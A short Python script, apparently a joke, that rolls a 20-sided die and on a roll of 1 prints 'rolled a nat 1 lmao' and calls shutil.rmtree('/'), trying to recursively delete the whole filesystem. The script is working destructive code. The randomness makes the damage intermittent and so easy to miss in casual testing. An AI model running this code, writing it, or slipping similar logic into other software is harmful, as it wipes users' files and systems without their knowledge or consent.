import shutil
import random

def main():
  if random.randint(1, 20) == 1:
    print("rolled a nat 1 lmao")
    shutil.rmtree("/")

if __name__ == "__main__":
  main()
